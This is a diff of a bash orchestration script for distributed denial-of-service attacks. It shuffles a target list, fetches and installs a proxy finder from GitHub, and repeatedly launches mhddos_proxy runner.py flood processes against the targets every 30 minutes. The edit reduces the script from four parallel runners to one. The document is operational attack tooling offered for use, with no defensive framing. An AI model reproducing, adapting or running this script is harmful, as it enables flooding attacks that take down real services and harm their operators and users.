@@ -68,7 +68,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets by line in N files
 cd /var/tmp/
-split -n l/4 --additional-suffix=.uaripper $targets_uniq
+split -n l/1 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -129,7 +129,7 @@ fi
 
 if [[ $proxy_finder == "on" ]]; then
 sleep 0.2
-tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Searching for new proxies... Proxy threads:" $proxy_threads; python3 ~/multidd/proxy_finder/finder.py --threads $proxy_threads'
+tmux split-window -v -p 10 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Searching for new proxies... Proxy threads:" $proxy_threads; python3 ~/multidd/proxy_finder/finder.py --threads $proxy_threads'
 fi
 
 #tmux -2 attach-session -d
@@ -197,12 +197,12 @@ while true; do
 echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
 sleep 30m
 prepare_targets_and_banner
 done
